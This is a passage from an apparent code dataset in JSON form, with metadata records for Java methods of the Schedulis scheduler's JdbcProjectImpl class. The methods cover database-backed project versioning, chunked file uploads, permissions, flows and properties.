failed.\", e);    }    final long duration = (System.currentTimeMillis() - startMs) / 1000;    logger.info(String.format(\"Uploaded Project ID: %d file: %s [%d bytes] in %d sec\", projectId,        localFile.getName(),        localFile.length(), duration));  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "computeHash", "params": ["File"], "throws": null, "modifiers": ["private"], "return_type": "byte", "snippet": "  private byte[] computeHash(final File localFile) {    logger.info(\"Creating message digest for upload \" + localFile.getName());    final byte[] md5;    try {      md5 = Md5Hasher.md5Hash(localFile);    } catch (final IOException e) {      throw new ProjectManagerException(\"Error getting md5 hash.\", e);    }    logger.info(\"Md5 hash created\");    return md5;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "addProjectVersion", "params": ["int", "int", "File", "String", "byte", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void addProjectVersion(      final int projectId,      final int version,      final File localFile,      final String uploader,      final byte[] md5,      final String resourceId) throws ProjectManagerException {    // when one transaction completes, it automatically commits.    final SQLTransaction<Integer> transaction = transOperator -> {      addProjectToProjectVersions(transOperator, projectId, version, localFile, uploader, md5,          resourceId);      return 1;    };    try {      this.dbOperator.transaction(transaction);    } catch (final SQLException e) {      logger.error(\"addProjectVersion failed.\", e);      throw new ProjectManagerException(\"addProjectVersion failed.\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "addProjectToProjectVersions", "params": ["DatabaseTransOperator", "int", "int", "File", "String", "byte", "String"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void addProjectToProjectVersions(      final DatabaseTransOperator transOperator,      final int projectId,      final int version,      final File localFile,      final String uploader,      final byte[] md5,      final String resourceId) throws ProjectManagerException {    final long updateTime = System.currentTimeMillis();    final String INSERT_PROJECT_VERSION = \"INSERT INTO project_versions \"        + \"(project_id, version, upload_time, uploader, file_type, file_name, md5, num_chunks, resource_id) values \"        + \"(?,?,?,?,?,?,?,?,?)\";    try {      /*       * As we don't know the num_chunks before uploading the file, we initialize it to 0,       * and will update it after uploading completes.       */      transOperator.update(INSERT_PROJECT_VERSION, projectId, version, updateTime, uploader,          Files.getFileExtension(localFile.getName()), localFile.getName(), md5, 0, resourceId);    } catch (final SQLException e) {      final String msg = String          .format(\"Error initializing project id: %d version: %d \", projectId, version);      logger.error(msg, e);      throw new ProjectManagerException(msg, e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadFileInChunks", "params": ["DatabaseTransOperator", "int", "int", "File"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "int", "snippet": "  private int uploadFileInChunks(final DatabaseTransOperator transOperator, final int projectId,      final int version, final File localFile)      throws ProjectManagerException {    // Really... I doubt we'll get a > 2gig file. So int casting it is!    final byte[] buffer = new byte[CHUCK_SIZE];    final String INSERT_PROJECT_FILES =        \"INSERT INTO project_files (project_id, version, chunk, size, file) values (?,?,?,?,?)\";    BufferedInputStream bufferedStream = null;    int chunk = 0;    try {      bufferedStream = new BufferedInputStream(new FileInputStream(localFile));      int size = bufferedStream.read(buffer);      while (size >= 0) {        logger.info(\"Read bytes for \" + localFile.getName() + \" size:\" + size);        byte[] buf = buffer;        if (size < buffer.length) {          buf = Arrays.copyOfRange(buffer, 0, size);        }        try {          logger.info(\"Running update for \" + localFile.getName() + \" chunk \" + chunk);          transOperator.update(INSERT_PROJECT_FILES, projectId, version, chunk, size, buf);          /*           * We enforce az committing to db when uploading every single chunk,           * in order to reduce the transaction duration and conserve sql server resources.           *           * If the files to be uploaded is very large and we don't commit every single chunk,           * the remote mysql server will run into memory troubles.           */          transOperator.getConnection().commit();          logger.info(\"Finished update for \" + localFile.getName() + \" chunk \" + chunk);        } catch (final SQLException e) {          throw new ProjectManagerException(\"Error Chunking during uploading files to db...\");        }        ++chunk;        size = bufferedStream.read(buffer);      }    } catch (final IOException e) {      throw new ProjectManagerException(          String.format(              \"Error chunking file. projectId: %d, version: %d, file:%s[%d bytes], chunk: %d\",              projectId,              version, localFile.getName(), localFile.length(), chunk));    } finally {      IOUtils.closeQuietly(bufferedStream);    }    return chunk;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updateChunksInProjectVersions", "params": ["DatabaseTransOperator", "int", "int", "int"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void updateChunksInProjectVersions(final DatabaseTransOperator transOperator,      final int projectId, final int version, final int chunk)      throws ProjectManagerException {    final String UPDATE_PROJECT_NUM_CHUNKS =        \"UPDATE project_versions SET num_chunks=? WHERE project_id=? AND version=?\";    try {      transOperator.update(UPDATE_PROJECT_NUM_CHUNKS, chunk, projectId, version);      transOperator.getConnection().commit();    } catch (final SQLException e) {      logger.error(\"Error updating project \" + projectId + \" : chunk_num \" + chunk, e);      throw new ProjectManagerException(          \"Error updating project \" + projectId + \" : chunk_num \" + chunk, e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchProjectMetaData", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "ProjectFileHandler", "snippet": "  public ProjectFileHandler fetchProjectMetaData(final int projectId, final int version) {    final ProjectVersionResultHandler pfHandler = new ProjectVersionResultHandler();    try {      final List<ProjectFileHandler> projectFiles =          this.dbOperator              .query(ProjectVersionResultHandler.SELECT_PROJECT_VERSION, pfHandler, projectId,                  version);      if (projectFiles == null || projectFiles.isEmpty()) {        return null;      }      return projectFiles.get(0);    } catch (final SQLException ex) {      logger.error(\"Query for uploaded file for project id \" + projectId + \" failed.\", ex);      throw new ProjectManagerException(          \"Query for uploaded file for project id \" + projectId + \" failed.\", ex);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getUploadedFile", "params": ["int", "int"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "ProjectFileHandler", "snippet": "  public ProjectFileHandler getUploadedFile(final int projectId, final int version)      throws ProjectManagerException {    final ProjectFileHandler projHandler = fetchProjectMetaData(projectId, version);    if (projHandler == null) {      return null;    }    final int numChunks = projHandler.getNumChunks();    if (numChunks <= 0) {      throw new ProjectManagerException(String.format(\"Got numChunks=%s for version %s of project \"              + \"%s - seems like this version has been cleaned up already, because enough newer \"              + \"versions have been uploaded. To increase the retention of project versions, set \"              + \"%s\", numChunks, version, projectId,          ConfigurationKeys.PROJECT_VERSION_RETENTION));    }    BufferedOutputStream bStream = null;    File file;    try {      try {        file = File            .createTempFile(projHandler.getFileName(), String.valueOf(version), this.tempDir);        bStream = new BufferedOutputStream(new FileOutputStream(file));      } catch (final IOException e) {        throw new ProjectManagerException(\"Error creating temp file for stream.\", e);      }      final int collect = 5;      int fromChunk = 0;      int toChunk = collect;      do {        final ProjectFileChunkResultHandler chunkHandler = new ProjectFileChunkResultHandler();        List<byte[]> data = null;        try {          data = this.dbOperator              .query(ProjectFileChunkResultHandler.SELECT_PROJECT_CHUNKS_FILE, chunkHandler,                  projectId,                  version, fromChunk, toChunk);        } catch (final SQLException e) {          logger.error(e);          throw new ProjectManagerException(\"Query for uploaded file for \" + projectId + \" failed.\",              e);        }        try {          for (final byte[] d : data) {            bStream.write(d);          }        } catch (final IOException e) {          throw new ProjectManagerException(\"Error writing file\", e);        }        // Add all the bytes to the stream.        fromChunk += collect;        toChunk += collect;      } while (fromChunk <= numChunks);    } finally {      IOUtils.closeQuietly(bStream);    }    // Check md5.    byte[] md5;    try {      md5 = Md5Hasher.md5Hash(file);    } catch (final IOException e) {      throw new ProjectManagerException(\"Error getting md5 hash.\", e);    }    if (Arrays.equals(projHandler.getMd5Hash(), md5)) {      logger.info(\"Md5 Hash is valid\");    } else {      throw new ProjectManagerException(          String.format(\"Md5 Hash failed on project %s version %s retrieval of file %s. \"                  + \"Expected hash: %s , got hash: %s\",              projHandler.getProjectId(), projHandler.getVersion(), file.getAbsolutePath(),              Arrays.toString(projHandler.getMd5Hash()), Arrays.toString(md5)));    }    projHandler.setLocalFile(file);    return projHandler;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "changeProjectVersion", "params": ["Project", "int", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void changeProjectVersion(final Project project, final int version, final String user)      throws ProjectManagerException {    final long timestamp = System.currentTimeMillis();    try {      final String UPDATE_PROJECT_VERSION =          \"UPDATE projects SET version=?,modified_time=?,last_modified_by=? WHERE id=?\";      this.dbOperator.update(UPDATE_PROJECT_VERSION, version, timestamp, user, project.getId());      project.setVersion(version);      project.setLastModifiedTimestamp(timestamp);      project.setLastModifiedUser(user);    } catch (final SQLException e) {      logger.error(\"Error updating switching project version \" + project.getName(), e);      throw new ProjectManagerException(          \"Error updating switching project version \" + project.getName(), e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updatePermission", "params": ["Project", "String", "Permission", "boolean"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updatePermission(final Project project, final String name, final Permission perm,      final boolean isGroup)      throws ProjectManagerException {    final long updateTime = System.currentTimeMillis();    try {      if (this.dbOperator.getDataSource().allowsOnDuplicateKey()) {        final String INSERT_PROJECT_PERMISSION =            \"INSERT INTO project_permissions (project_id, modified_time, name, permissions, isGroup) values (?,?,?,?,?)\"                + \"ON DUPLICATE KEY UPDATE modified_time = VALUES(modified_time), permissions = VALUES(permissions)\";        this.dbOperator            .update(INSERT_PROJECT_PERMISSION, project.getId(), updateTime, name, perm.toFlags(),                isGroup);      } else {        final String MERGE_PROJECT_PERMISSION =            \"MERGE INTO project_permissions (project_id, modified_time, name, permissions, isGroup) KEY (project_id, name) values (?,?,?,?,?)\";        this.dbOperator            .update(MERGE_PROJECT_PERMISSION, project.getId(), updateTime, name, perm.toFlags(),                isGroup);      }    } catch (final SQLException ex) {      logger.error(\"Error updating project permission\", ex);      throw new ProjectManagerException(          \"Error updating project \" + project.getName() + \" permissions for \" + name, ex);    }    if (isGroup) {      project.setGroupPermission(name, perm);      project.setUserPermission(name, perm);    } else {      project.setUserPermission(name, perm);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updateProjectSettings", "params": ["Project"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateProjectSettings(final Project project) throws ProjectManagerException {    updateProjectSettings(project, this.defaultEncodingType);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "convertJsonToBytes", "params": ["EncodingType", "String"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "byte", "snippet": "  private byte[] convertJsonToBytes(final EncodingType type, final String json) throws IOException {    byte[] data = json.getBytes(\"UTF-8\");    if (type == EncodingType.GZIP) {      data = GZIPUtils.gzipBytes(data);    }    return data;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updateProjectSettings", "params": ["Project", "EncodingType"], "throws": ["ProjectManagerException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void updateProjectSettings(final Project project, final EncodingType encType)      throws ProjectManagerException {    final String UPDATE_PROJECT_SETTINGS = \"UPDATE projects SET enc_type=?, settings_blob=? WHERE id=?\";    final String json = JSONUtils.toJSON(project.toObject());    byte[] data = null;    try {      data = convertJsonToBytes(encType, json);      logger.debug(\"NumChars: \" + json.length() + \" Gzip:\" + data.length);    } catch (final IOException e) {      throw new ProjectManagerException(\"Failed to encode. \", e);    }    try {      this.dbOperator.update(UPDATE_PROJECT_SETTINGS, encType.getNumVal(), data, project.getId());    } catch (final SQLException e) {      logger.error(\"update Project Settings failed.\", e);      throw new ProjectManagerException(          \"Error updating project \" + project.getName() + \" version \" + project.getVersion(), e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "removePermission", "params": ["Project", "String", "boolean"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void removePermission(final Project project, final String name, final boolean isGroup)      throws ProjectManagerException {    final String DELETE_PROJECT_PERMISSION =        \"DELETE FROM project_permissions WHERE project_id=? AND name=? AND isGroup=?\";    try {      this.dbOperator.update(DELETE_PROJECT_PERMISSION, project.getId(), name, isGroup);    } catch (final SQLException e) {      logger.error(\"remove Permission failed.\", e);      throw new ProjectManagerException(          \"Error deleting project \" + project.getName() + \" permissions for \" + name, e);    }    if (isGroup) {      project.removeGroupPermission(name);    } else {      project.removeUserPermission(name);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getProjectPermissions", "params": ["Project"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "List<Triple>", "snippet": "  public List<Triple<String, Boolean, Permission>> getProjectPermissions(final Project project)      throws ProjectManagerException {    return fetchPermissionsForProject(project);  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "removeProject", "params": ["Project", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void removeProject(final Project project, final String user)      throws ProjectManagerException {    final long updateTime = System.currentTimeMillis();    final String UPDATE_INACTIVE_PROJECT =        \"UPDATE projects SET active=false,modified_time=?,last_modified_by=? WHERE id=?\";    try {      this.dbOperator.update(UPDATE_INACTIVE_PROJECT, updateTime, user, project.getId());    } catch (final SQLException e) {      logger.error(\"error remove project \" + project.getName(), e);      throw new ProjectManagerException(\"Error remove project \" + project.getName(), e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getRunningFlow", "params": ["Project"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "List<Flow>", "snippet": "  public List<Flow> getRunningFlow(Project project) throws ProjectManagerException {    List<Flow> runningFlowList = null;    final  JdbcProjectHandlerSet.ProjectRunningFlowHandler permHander = new JdbcProjectHandlerSet.ProjectRunningFlowHandler();    try {      runningFlowList = this.dbOperator.query(JdbcProjectHandlerSet.ProjectRunningFlowHandler.QUERY_RUNNING_FLOWS, permHander, project.getId());    } catch (final SQLException e) {      logger.error(\"get running flow failed, by project name: \" + project.getName(), e);      throw new ProjectManagerException(\"get running flow failed, by project name: \" + project.getName(), e);    }    return runningFlowList;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "postEvent", "params": ["Project", "EventType", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean postEvent(final Project project, final EventType type, final String user,      final String message) {    final String INSERT_PROJECT_EVENTS =        \"INSERT INTO project_events (project_id, event_type, event_time, username, message) values (?,?,?,?,?)\";    final long updateTime = System.currentTimeMillis();    try {      this.dbOperator          .update(INSERT_PROJECT_EVENTS, project.getId(), type.getNumVal(), updateTime, user,              message);    } catch (final SQLException e) {      logger.error(\"post event failed,\", e);      return false;    }    return true;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getProjectEvents", "params": ["Project", "int", "int"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "List<ProjectLogEvent>", "snippet": "  public List<ProjectLogEvent> getProjectEvents(final Project project, final int num,      final int skip) throws ProjectManagerException {    final ProjectLogsResultHandler logHandler = new ProjectLogsResultHandler();    List<ProjectLogEvent> events = null;    try {      events = this.dbOperator          .query(ProjectLogsResultHandler.SELECT_PROJECT_EVENTS_ORDER, logHandler, project.getId(),              num,              skip);    } catch (final SQLException e) {      logger.error(\"Error getProjectEvents, project \" + project.getName(), e);      throw new ProjectManagerException(\"Error getProjectEvents, project \" + project.getName(), e);    }    return events;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updateDescription", "params": ["Project", "String", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateDescription(final Project project, final String description, final String user)      throws ProjectManagerException {    final String UPDATE_PROJECT_DESCRIPTION =        \"UPDATE projects SET description=?,modified_time=?,last_modified_by=? WHERE id=?\";    final long updateTime = System.currentTimeMillis();    try {      this.dbOperator          .update(UPDATE_PROJECT_DESCRIPTION, description, updateTime, user, project.getId());      project.setDescription(description);      project.setLastModifiedTimestamp(updateTime);      project.setLastModifiedUser(user);    } catch (final SQLException e) {      logger.error(e);      throw new ProjectManagerException(\"Error update Description, project \" + project.getName(),          e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "getLatestProjectVersion", "params": ["Project"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getLatestProjectVersion(final Project project) throws ProjectManagerException {    final IntHandler handler = new IntHandler();    try {      return this.dbOperator.query(IntHandler.SELECT_LATEST_VERSION, handler, project.getId());    } catch (final SQLException e) {      logger.error(e);      throw new ProjectManagerException(          \"Error marking project \" + project.getName() + \" as inactive\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadFlows", "params": ["Project", "int", "Collection<Flow>"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadFlows(final Project project, final int version, final Collection<Flow> flows)      throws ProjectManagerException {    // We do one at a time instead of batch... because well, the batch could be    // large.    logger.info(\"Uploading flows\");    try {      for (final Flow flow : flows) {        uploadFlow(project, version, flow, this.defaultEncodingType);      }    } catch (final IOException e) {      throw new ProjectManagerException(\"Flow Upload failed.\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadFlow", "params": ["Project", "int", "Flow"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadFlow(final Project project, final int version, final Flow flow)      throws ProjectManagerException {    logger.info(\"Uploading flow \" + flow.getId());    try {      uploadFlow(project, version, flow, this.defaultEncodingType);    } catch (final IOException e) {      throw new ProjectManagerException(\"Flow Upload failed.\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updateFlow", "params": ["Project", "int", "Flow"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateFlow(final Project project, final int version, final Flow flow)      throws ProjectManagerException {    logger.info(\"Uploading flow \" + flow.getId());    try {      final String json = JSONUtils.toJSON(flow.toObject());      final byte[] data = convertJsonToBytes(this.defaultEncodingType, json);      logger.info(\"Flow upload \" + flow.getId() + \" is byte size \" + data.length);      final String UPDATE_FLOW =          \"UPDATE project_flows SET encoding_type=?,json=? WHERE project_id=? AND version=? AND flow_id=?\";      try {        this.dbOperator            .update(UPDATE_FLOW, this.defaultEncodingType.getNumVal(), data, project.getId(),                version, flow.getId());      } catch (final SQLException e) {        logger.error(\"Error inserting flow\", e);        throw new ProjectManagerException(\"Error inserting flow \" + flow.getId(), e);      }    } catch (final IOException e) {      throw new ProjectManagerException(\"Flow Upload failed.\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadFlow", "params": ["Project", "int", "Flow", "EncodingType"], "throws": ["ProjectManagerException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void uploadFlow(final Project project, final int version, final Flow flow,      final EncodingType encType)      throws ProjectManagerException, IOException {    final String json = JSONUtils.toJSON(flow.toObject());    final byte[] data = convertJsonToBytes(encType, json);    logger.info(\"Flow upload \" + flow.getId() + \" is byte size \" + data.length);    final String INSERT_FLOW =        \"INSERT INTO project_flows (project_id, version, flow_id, modified_time, encoding_type, json) values (?,?,?,?,?,?)\";    try {      this.dbOperator          .update(INSERT_FLOW, project.getId(), version, flow.getId(), System.currentTimeMillis(),              encType.getNumVal(), data);    } catch (final SQLException e) {      logger.error(\"Error inserting flow\", e);      throw new ProjectManagerException(\"Error inserting flow \" + flow.getId(), e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchFlow", "params": ["Project", "String"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "Flow", "snippet": "  public Flow fetchFlow(final Project project, final String flowId) throws ProjectManagerException {    throw new UnsupportedOperationException(\"this method has not been instantiated.\");  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "fetchAllProjectFlows", "params": ["Project"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "List<Flow>", "snippet": "  public List<Flow> fetchAllProjectFlows(final Project project) throws ProjectManagerException {    final ProjectFlowsResultHandler handler = new ProjectFlowsResultHandler();    List<Flow> flows = null;    try {      flows = this.dbOperator          .query(ProjectFlowsResultHandler.SELECT_ALL_PROJECT_FLOWS, handler, project.getId(),              project.getVersion());    } catch (final SQLException e) {      throw new ProjectManagerException(          \"Error fetching flows from project \" + project.getName() + \" version \" + project              .getVersion(), e);    }    return flows;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadProjectProperties", "params": ["Project", "List<Props>"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadProjectProperties(final Project project, final List<Props> properties)      throws ProjectManagerException {    for (final Props props : properties) {      try {        uploadProjectProperty(project, props.getSource(), props);      } catch (final IOException e) {        throw new ProjectManagerException(\"Error uploading project property file\", e);      }    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadProjectProperty", "params": ["Project", "Props"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void uploadProjectProperty(final Project project, final Props props)      throws ProjectManagerException {    try {      uploadProjectProperty(project, props.getSource(), props);    } catch (final IOException e) {      throw new ProjectManagerException(\"Error uploading project property file\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updateProjectProperty", "params": ["Project", "Props"], "throws": ["ProjectManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void updateProjectProperty(final Project project, final Props props)      throws ProjectManagerException {    try {      updateProjectProperty(project, props.getSource(), props);    } catch (final IOException e) {      throw new ProjectManagerException(\"Error uploading project property file\", e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "updateProjectProperty", "params": ["Project", "String", "Props"], "throws": ["ProjectManagerException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void updateProjectProperty(final Project project, final String name, final Props props)      throws ProjectManagerException, IOException {    final String UPDATE_PROPERTIES =        \"UPDATE project_properties SET property=? WHERE project_id=? AND version=? AND name=?\";    final byte[] propsData = getBytes(props);    try {      this.dbOperator          .update(UPDATE_PROPERTIES, propsData, project.getId(), project.getVersion(), name);    } catch (final SQLException e) {      throw new ProjectManagerException(          \"Error updating property \" + project.getName() + \" version \" + project.getVersion(), e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], "modifiers": ["public"]}}, {"method_name": "uploadProjectProperty", "params": ["Project", "String", "Props"], "throws": ["ProjectManagerException", "IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void uploadProjectProperty(final Project project, final String name, final Props props)      throws ProjectManagerException, IOException {    final String INSERT_PROPERTIES =        \"INSERT INTO project_properties (project_id, version, name, modified_time, encoding_type, property) values (?,?,?,?,?,?)\";    final byte[] propsData = getBytes(props);    try {      this.dbOperator.update(INSERT_PROPERTIES, project.getId(), project.getVersion(), name,          System.currentTimeMillis(),          this.defaultEncodingType.getNumVal(), propsData);    } catch (final SQLException e) {      throw new ProjectManagerException(          \"Error uploading project properties \" + name + \" into \" + project.getName() + \" version \"              + project.getVersion(), e);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/JdbcProjectImpl.java", "stars": "18", "class": {"name": "JdbcProjectImpl", "extends": null, "implements": ["ProjectLoader"], 